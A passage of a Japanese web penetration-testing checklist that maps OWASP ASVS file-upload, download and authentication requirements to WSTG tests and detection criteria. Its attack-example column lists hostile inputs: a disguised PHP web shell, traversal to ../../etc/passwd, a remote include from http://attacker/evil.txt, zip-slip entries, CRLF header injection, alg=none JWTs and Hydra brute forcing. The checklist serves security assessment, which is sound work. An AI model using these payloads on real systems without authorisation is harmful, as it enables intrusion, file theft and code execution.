| V5.1.1 | L2 | 機能ごとの許可拡張子・最大サイズ（展開後含む）・悪性検出時の動作を文書化 | 範囲外 | 仕様・運用文書の有無をヒアリングで確認 | - | - | - |

---

## V5.2 ファイルアップロードとコンテンツ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V5.2.1 | L1 | 処理可能サイズのみ受け付け（DoS防止） | 対応可 | 大容量/境界サイズでエラー挙動確認 | [WSTG-BUSL-09](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)/[PortSwigger WSA](https://portswigger.net/web-security/file-upload)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/)/[CWE-400](https://cwe.mitre.org/data/definitions/400.html) | 数百MB〜GB級ファイルを連投（プロフィール画像/添付等）して処理停滞を誘発 | 413等の拒否がなくスレッド枯渇/タイムアウト/高負荷を観測できればサイズ制御不備として検出 |
| V5.2.2 | L1 | 拡張子と内容（マジックバイト等）の整合検証 | 対応可 | 偽装拡張子/再エンコード画像で検証 | [WSTG-BUSL-08](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types)/[PortSwigger WSA](https://portswigger.net/web-security/file-upload)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/)/[CWE-434](https://cwe.mitre.org/data/definitions/434.html) | `shell.php` を `shell.jpg`/複拡張`jpg.php`にして MIME/マジックバイト偽装で通過を狙う | サーバ側でMIME/シグネチャ不一致でも受理される・実行/配信されるなら検出 |
| V5.2.3 | L2 | 解凍前に最大非圧縮サイズ・最大ファイル数を検証 | 対応可 | zip bomb 簡易版で挙動確認（軽負荷） | [WSTG-BUSL-09](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)/[PortSwigger WSA](https://portswigger.net/web-security/file-upload)/[HackTricks](https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/imagemagick-security)/[CWE-400](https://cwe.mitre.org/data/definitions/400.html) | 高圧縮率アーカイブ（zip bomb/ネスト深いzip）を提出 | 展開でCPU/メモリ/ディスクが急増・サービス劣化を観測できれば検出 |
| V5.2.4 | L3 | ユーザ毎の容量/件数クォータを適用 | 対応可 | 連続アップロードで上限適用確認 | [WSTG-BUSL-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits)/[PortSwigger WSA](https://portswigger.net/web-security/race-conditions)/[CWE-770](https://cwe.mitre.org/data/definitions/770.html) | 1ユーザで短時間に多数/大容量のアップロードを繰返し、クォータ超過を試行 | 上限超過でも拒否/遅延/通知が無い、別経路で迂回可能なら検出 |
| V5.2.5 | L3 | アーカイブ内シンボリックリンクの拒否（必要時は許可リスト） | 対応可 | symlink/相対リンクを含むzipで展開挙動確認 | [WSTG-BUSL-09](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Zip%20Slip/)/[Android Developers](https://developer.android.com/privacy-and-security/risks/zip-path-traversal)/[CWE-59](https://cwe.mitre.org/data/definitions/59.html) | `../../var/www/html/` などを指す symlink を含むzip（Archive Directory Traversal） | 展開時にベース外へ書込/参照される・パス正規化無しで抜けるなら検出 |
| V5.2.6 | L3 | 画像ピクセルサイズ上限でピクセルフラッド防止 | 対応可 | 超高解像画像の拒否/再サンプル有無の確認 | [WSTG-BUSL-09](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)/[PortSwigger WSA](https://portswigger.net/web-security/file-upload)/[HackTricks](https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/imagemagick-security)/[CWE-400](https://cwe.mitre.org/data/definitions/400.html) | 10^8ピクセル級/多フレーム画像（巨大PNG/APNG/GIF）を投入 | サーバ側でピクセル数制限/再サンプル無しで処理負荷急増・OOM等が起これば検出 |

---

## V5.3 ファイル保存

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V5.3.1 | L1 | 公開領域のアップロード/生成ファイルを実行不可に | 対応可 | Webルート配下の実行可否/拡張子マップ確認 | [WSTG-CONF-03](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information)/[PortSwigger WSA](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/)/[CWE-434](https://cwe.mitre.org/data/definitions/434.html) | `.php/.jsp` をアップロードして直参照で実行可否を確認 | 実行される/ソース非表示で処理されるなら実行不可設定不備として検出 |
| V5.3.2 | L1 | パス生成は内部ID等を使用し、ユーザ入力は厳格検証 | 対応可 | パストラバーサル/LFI/RFI/SSRF試験 | [WSTG-ATHZ-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include)/[PortSwigger WSA](https://portswigger.net/web-security/file-path-traversal)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Directory%20Traversal/)/[CWE-22](https://cwe.mitre.org/data/definitions/22.html) | `file=../../etc/passwd` や `file=http://attacker/evil.txt` などで参照/包含を狙う | 目的外ファイルの読取/包含が可能・パス正規化/許可リスト不備が確認できれば検出 |
| V5.3.3 | L3 | 展開処理でユーザ提供のパス情報を無視（zip slip防止） | 対応可 | `../`含むエントリの展開結果を検証 | [WSTG-BUSL-09](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Zip%20Slip/)/[Android Developers](https://developer.android.com/privacy-and-security/risks/zip-path-traversal)/[CWE-22](https://cwe.mitre.org/data/definitions/22.html) | `../../webroot/app.php` 等のエントリ名を持つzipで展開先外への書込み（zip slip） | 展開時にベースディレクトリ外へファイル生成/上書きできれば検出 |

---

## V5.4 ファイルダウンロード

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V5.4.1 | L2 | 応答の Content-Disposition でサーバ側ファイル名を明示 | 対応可 | URL/JSON指定名を無視しヘッダ名が優先か確認 | [WSTG-CONF-14](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations)/[MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition)/[RFC6266](https://www.rfc-editor.org/rfc/rfc6266) | ダウンロード時、アプリ提供名に依存させて任意の拡張子/実行形式を誘導 | 一律に `Content-Disposition: attachment; filename=...` が設定されず、拡張子や挙動が不定なら検出 |
| V5.4.2 | L2 | 提供ファイル名をエンコード/サニタイズ（RFC6266遵守） | 対応可 | 非ASCII/制御文字混入時の挙動確認 | [WSTG-INPV-15](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling)/[PortSwigger WSA](https://portswigger.net/kb/issues/00200200_http-response-header-injection)/[CWE-113](https://cwe.mitre.org/data/definitions/113.html)/[RFC6266](https://www.rfc-editor.org/rfc/rfc6266) | `filename="a.csv"\r\nX-Test: 1` 等でCRLF注入/ヘッダ分割を試行 | CRLF混入でヘッダが増殖/改変される、あるいは応答分割が起きれば検出 |
| V5.4.3 | L2 | 信頼できない取得元のファイルをAVスキャン | 範囲外 | スキャン有無は運用/設計確認 | - | - | - |

# V6 認証

## V6.1 認証ドキュメント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V6.1.1 | L1 | 認証攻撃対策（レート制限/自動化防止/応答方針）の文書化 | 範囲外 | 文書/設定の提示依頼・ヒアリング | - | - | - |
| V6.1.2 | L2 | コンテキスト固有NGワードのリスト化（パスワード禁止語） | 範囲外 | リスト有無の確認 | - | - | - |
| V6.1.3 | L2 | 複数経路の統一セキュリティ制御・強度を文書化 | 範囲外 | すべてのログイン経路を洗い出し | - | - | - |

---

## V6.2 パスワードセキュリティ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V6.2.1 | L1 | 最低8桁（推奨15桁） | 対応可 | フロント/サーバの最小長検証 | [WSTG-ATHN-07](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/password-based)/[CWE-521](https://cwe.mitre.org/data/definitions/521.html)/[NIST 800-63B §5.1.1.2](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret) | 7文字以下や極端に短いPWを受理させる | 変更/登録フローで境界値(7/8/15)を試行し許容可否を確認 |
| V6.2.2 | L1 | ユーザが任意にパスワード変更可 | 対応可 | 変更フローの有無確認 | [WSTG-ATHN-09](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/other-mechanisms)/[CWE-640](https://cwe.mitre.org/data/definitions/640.html) | 変更UI不備により強制変更不可の状態 | アカウントでログイン後、自己変更フローの有無・正当性(本人認証)を確認 |
| V6.2.3 | L1 | 変更時に現行PWと新PWを要求 | 対応可 | 現行PW省略不可を確認 | [WSTG-ATHN-09](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/other-mechanisms)/[CWE-620](https://cwe.mitre.org/data/definitions/620.html) | 現行PW不要の変更エンドポイントにCSRFでパスワード差し替え | 現行PW未入力や他人セッションで変更が成功しないことを確認 |
| V6.2.4 | L1 | 上位弱PWリスト（≥3000）照合 | 対応可 | 典型弱PWの拒否確認 | [WSTG-ATHN-07](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/password-based)/[CWE-521](https://cwe.mitre.org/data/definitions/521.html)/[NIST 800-63B §5.1.1.2](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret) | 「Password123!」「12345678」等の一般的弱PWが通る | 代表弱PWを登録/変更で試行し拒否されるか確認 |
| V6.2.5 | L1 | 文字種ルール強制なし（構成自由） | 対応可 | 複雑性強制の有無を確認 | [WSTG-ATHN-07](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy)/[CWE-521](https://cwe.mitre.org/data/definitions/521.html)/[NIST 800-63B §5.1.1.2](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret) | 特定の構成強制により短い規則的PWが許容されやすい | 文字種必須ルールの有無・短い規則PWの許容可否を確認 |
| V6.2.6 | L1 | type=password＋一時表示トグル | 対応可 | マスク/表示切替の挙動確認 | [WSTG-ATHN-06](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses)/[CWE-525](https://cwe.mitre.org/data/definitions/525.html) | ログアウト後に戻る操作で入力値や機密が表示される | ログアウト後のBack操作やキャッシュ制御ヘッダで残存表示の有無確認 |
| V6.2.7 | L1 | 貼り付け/ブラウザ/外部管理を許可 | 対応可 | ペースト禁止の有無 | [WSTG-ATHN-05](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/05-Testing_for_Vulnerable_Remember_Password)/[NIST 800-63B §5.1.1.2](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret)/[MDN autocomplete](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/autocomplete) | ブラウザの「保存されたPW」に依存/漏えいしうるUIの不備 | フィールドのpaste禁止/auto-complete制御の有無を確認 |
| V6.2.8 | L1 | サーバ側で改変せず厳密検証（大文字化/切捨てなし） | 対応可 | 大文字/末尾空白等で検証 | [WSTG-ATHN-07](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy)/[CWE-521](https://cwe.mitre.org/data/definitions/521.html) | 大文字小文字同一視/末尾切捨てでPW空間が縮小 | 大文字/末尾空白/長さ変化で同一認証可否を比較 |
| V6.2.9 | L2 | 64桁以上を許容 | 対応可 | 長文PWの受入/ログイン確認 | [WSTG-ATHN-07](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy)/[NIST 800-63B §5.1.1.2](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret) | 65〜128桁などの長PWが拒否され総当たり耐性が低下 | 長文PWの登録/認証が可能か確認 |
| V6.2.10 | L2 | 定期変更強制なし（侵害時のみ変更） | 対応可 | 期限強制の有無確認 | [WSTG-ATHN-07](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy)/[NIST 800-63B §5.1.1.2](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret) | パスワード有効期限強制により弱い再設定を誘発 | パスワード有効期限/履歴強制の有無をUI/挙動で確認 |
| V6.2.11 | L2 | 文書化NGワード照合で推測容易PWを排除 | 範囲外 | リスト運用の有無のみ確認 | - | - | - |
| V6.2.12 | L2 | 侵害PWリスト照合 | 対応可 | 既知漏えいPW拒否確認 | [WSTG-ATHN-07](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy)/[NIST 800-63B §5.1.1.2](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret) | 「Summer2020!」等漏えい既知PWが通る | 既知漏えいPWを登録/変更で試行し拒否判定を確認 |

---

## V6.3 一般的な認証セキュリティ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V6.3.1 | L1 | 攻撃対策（レート制限等）を実装 | 対応可 | 連続試行/遅延/ロック挙動確認 | [WSTG-ATHN-03](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/password-based)/[CWE-307](https://cwe.mitre.org/data/definitions/307.html) | Hydra等で高速総当たり→ロック/遅延が効かず突破 | 一定回数失敗後のロック/遅延/通知発火を観察 |
| V6.3.2 | L1 | 既定アカウントの不存在/無効化 | 対応可 | admin/root等のログイン試行 | [WSTG-ATHN-02](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials)/[CWE-1392](https://cwe.mitre.org/data/definitions/1392.html)/[CWE-798](https://cwe.mitre.org/data/definitions/798.html) | ベンダ既定(admin/admin等)でログイン成功 | 既知既定資格情報での認証試行と成功可否を確認 |
| V6.3.3 | L2 | MFA必須（L3はハードウェア要素含む） | 対応可 | MFA有無/要素種/フィッシング耐性を確認 | [WSTG-ATHN-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/securing) | TOTP/SMS等の2要素をバイパス（再認証欠如/再利用） | MFA登録/認証/リカバリ経路での回避可否を試験 |
| V6.3.4 | L2 | 全認証経路で統一強度・無許可経路なし | 対応可 | バックドア/隠しエンドポイント探索 | [WSTG-ATHN-04](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema)/[CWE-288](https://cwe.mitre.org/data/definitions/288.html) | 直リンク/モバイルAPIで認証回避（パラメータ改竄等） | 代替UI/API直叩き等で認証スキーマの迂回有無を確認 |
| V6.3.5 | L3 | 異常サインインのユーザ通知 | 対応可 | 地理/UA/失敗後成功の通知有無 | [WSTG-ATHN-09](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities)/[CWE-778](https://cwe.mitre.org/data/definitions/778.html) | 異常地点/新端末から成功しても通知が届かない | 認証履歴に影響する操作後のメール/アラート送信有無を確認 |
| V6.3.6 | L3 | メールを認証要素として不使用 | 対応可 | メールリンクのみでの認証不可を確認 | [WSTG-ATHN-10](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/securing)/[CWE-308](https://cwe.mitre.org/data/definitions/308.html) | メールのマジックリンク単独で恒常ログイン可能 | 代替チャネル(メール/SMS)の強度と単要素運用の有無を確認 |
| V6.3.7 | L3 | 資格情報更新後のユーザ通知 | 対応可 | メアド/UN/PW変更時の通知確認 | [WSTG-ATHN-09](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities)/[CWE-778](https://cwe.mitre.org/data/definitions/778.html) | パスワード/メール変更後も通知が無く乗っ取り継続 | 変更/リセット直後の通知(メール/監査ログ)発行有無を確認 |
| V6.3.8 | L3 | 認証エラーでユーザ存在を推測不可 | 対応可 | エラーメッセージ/応答時間の差異検査 | [WSTG-IDNT-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/password-based/)/[CWE-203](https://cwe.mitre.org/data/definitions/203.html) | ログイン/リセットで存在/不存在の文言差異や時間差 | 成功/失敗/未登録での応答本文/時間の差を比較 |

## V6.4 認証要素のライフサイクルとリカバリ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的攻撃例 | 精査方法（検出理由） |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V6.4.1 | L1 | 初期PW/コードは安全生成・短期失効 | 対応可 | 初期化フローの失効確認 | [WSTG-ATHN-09](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/other-mechanisms)/[CWE-640](https://cwe.mitre.org/data/definitions/640.html) | 有効期限切れの初期化リンク/リセットトークンが再利用できる | 期限超過・一度使用済みトークンで再度リクエストし受理されるかを確認（使い回し/長寿命の検出） |
| V6.4.2 | L1 | PWヒント/秘密の質問を不使用 | 対応可 | UI/文言の有無確認 | [WSTG-ATHN-08](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/other-mechanisms#weak-security-questions) | 秘密の質問の総当り/公開情報からの推測 | 回答のレート制限/ロック有無と弱い質問・回答の受理を確認 |
| V6.4.3 | L2 | 安全なPWリセット（MFAバイパス不可） | 対応可 | リセット経路での本人性確認 | [WSTG-ATHN-09 / WSTG-ATHN-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/other-mechanisms)/[CWE-640](https://cwe.mitre.org/data/definitions/640.html) | リセットリンクだけでMFAを回避して再ログイン | MFA未完了状態でのリセット完了可否・弱いリセットトークン受理を確認 |
| V6.4.4 | L2 | MFA要素紛失時は登録時同等の再本人確認 | 範囲外 | 手続/運用ヒアリング中心 | - | - | - |
| V6.4.5 | L3 | 期限切れ前の更新案内＋リマインダ | 範囲外 | 通知運用の確認 | - | - | - |
| V6.4.6 | L3 | 管理者はリセット開始のみ可（PW設定不可） | 対応可 | 管理画面の権限範囲確認 | [WSTG-ATHN-09](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities)/[CWE-862](https://cwe.mitre.org/data/definitions/862.html) | 管理UIからユーザPWを直接設定して乗っ取り | 管理UIで「リセット開始のみ」になっているか、直接設定が可能かを操作検証 |


---

## V6.5 一般的な多要素認証要件

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的攻撃例 | 精査方法（検出理由） |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V6.5.1 | L2 | ルックアップ/経路外/ TOTP は一回限り使用 | 対応可 | 再利用試行の拒否確認 | [WSTG-ATHN-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/multi-factor)/[RFC 6238](https://www.rfc-editor.org/rfc/rfc6238) | 同一TOTP/バックアップコードの再送で再認証成功 | 同一コードの二度目使用を試し受理されないことを確認（ワンタイム性） |
| V6.5.2 | L2 | 低エントロピーのルックアップはソルト付ハッシュ保管 | 範囲外 | 保管方式は設計確認 | - | - | - |
| V6.5.3 | L2 | シード/コードはCSPRNGで生成 | 範囲外 | 実装/設計の確認 | - | - | - |
| V6.5.4 | L2 | ルックアップ/経路外コードに≥20ビットの熵 | 範囲外 | 桁数/文字集合の設計確認 | - | - | - |
| V6.5.5 | L2 | 経路外/TOTPの有効時間制限（10分/30秒） | 対応可 | 期限超過時の拒否確認 | [WSTG-ATHN-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication)/[RFC 6238](https://www.rfc-editor.org/rfc/rfc6238)/[NIST 800-63B §5.1](https://pages.nist.gov/800-63-3/sp800-63b.html#sec5) | 失効後のTOTP/コードが受理される | 有効期限超過での認証可否を確認（失効未実装の検出） |
| V6.5.6 | L3 | あらゆる要素は紛失時に無効化可能 | 対応可 | 端末紛失時の失効手続確認 | [WSTG-ATHN-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication)/[NIST 800-63B](https://pages.nist.gov/800-63-3/sp800-63b.html) | 紛失登録要素（TOTPデバイス/プッシュ端末）で引き続き認証可能 | 管理画面/自己操作での要素失効後に再利用できないことを確認 |
| V6.5.7 | L3 | 生体は二次要素としてのみ使用 | 対応可 | 生体単体ログイン不可を確認 | [WSTG-ATHN-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication)/[NIST 800-63B §5.2.3](https://pages.nist.gov/800-63-3/sp800-63b.html#biometric_requirements) | 生体のみ（他要素なし）でリスク操作に成功 | 生体のみ許容のフロー有無と高リスク操作での要素数検証 |
| V6.5.8 | L3 | TOTPの時刻検証は信頼時間源に基づく | 対応可 | 端末時刻改ざん耐性の確認 | [WSTG-ATHN-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication)/[RFC 6238](https://www.rfc-editor.org/rfc/rfc6238) | 端末時計を大幅にずらしてTOTPを通過 | 許容ドリフト超過でも受理されるかを確認（時刻検証欠如） |

---

## V6.6 経路外認証メカニズム

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的攻撃例 | 精査方法（検出理由） |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V6.6.1 | L2 | PSTN/SMSは要電話番号検証・代替手段提供（L3は不可） | 対応可 | SMS依存の度合い/回避策確認 | [WSTG-ATHN-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/securing) | SMS番号未検証でOTPが配信・承認される | 異なる未検証番号/変更直後の番号でOTPが通るかを確認 |
| V6.6.2 | L2 | 経路外コードは元リクエストにバインド（再利用不可） | 対応可 | 異セッション/時間差試行で確認 | [WSTG-ATHN-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel)/[CWE-294](https://cwe.mitre.org/data/definitions/294.html) | 別ブラウザ/別セッションで同一コードを使い回して認証 | コード再利用・別端末/別セッション適用で受理されないことを確認 |
| V6.6.3 | L2 | コード型経路外はレート制限＋高エントロピー検討 | 対応可 | 連続試行のブロック確認 | [WSTG-ATHN-03](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/multi-factor) | 経路外コードの総当り（連続誤入力での通過） | 一定回数超過でのロック/遅延/追加検証の発動を確認 |
| V6.6.4 | L3 | プッシュ利用時にレート制限/番号照合で爆撃対策 | 対応可 | 連投時の抑制動作確認 | [WSTG-ATHN-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication)/[CISA Fact Sheet](https://www.cisa.gov/audiences/small-and-medium-businesses/secure-your-business/require-multifactor-authentication) | プッシュ通知の連投（MFA疲労攻撃）で誤承認を誘発 | 高頻度プッシュ時の抑止/番号一致（Number Matching）等の確認 |


---

## V6.7 暗号認証メカニズム

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的攻撃例 | 精査方法（検出理由） |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V6.7.1 | L3 | 検証用証明書を改ざん耐性の方法で保管 | 範囲外 | 保管方式の設計確認 | - | - | - |
| V6.7.2 | L3 | チャレンジナンス≥64bitで一意 | 対応可 | 重複/短小値の検証困難のため設計確認 | [WSTG-SESS-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema)/[CWE-330](https://cwe.mitre.org/data/definitions/330.html) | 予測可能/短小ナンスでチャレンジ再利用・衝突 | ナンスの長さ・一意性・推測可能性（統計/衝突観測）を確認 |

---

## V6.8 アイデンティティプロバイダによる認証

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的攻撃例 | 精査方法（検出理由） |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V6.8.1 | L2 | IdP間なりすまし防止（IdPID×UserIDの組合せ識別） | 対応可 | 同一メールで別IdPの衝突確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[PortSwigger WSA](https://portswigger.net/web-security/oauth)/[PortSwigger WSA](https://portswigger.net/web-security/oauth/) | 別IdPの同一メールで既存アカウントにリンク（iss/sub未検証） | `iss`と`sub`の組合せ検証/IdP固有IDのバインド有無をトークン解析で確認 |
| V6.8.2 | L2 | JWT/SAML等の署名必須・検証 | 対応可 | 署名無し/無効署名の拒否確認 | [WSTG-SESS-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)/[PortSwigger WSA](https://portswigger.net/web-security/jwt)/[CWE-347](https://cwe.mitre.org/data/definitions/347.html) | `alg=none`/弱鍵/署名改ざんJWTで通過、SAML署名未検証 | トークン改変後の受理可否/アルゴリズム固定/鍵管理を検証 |
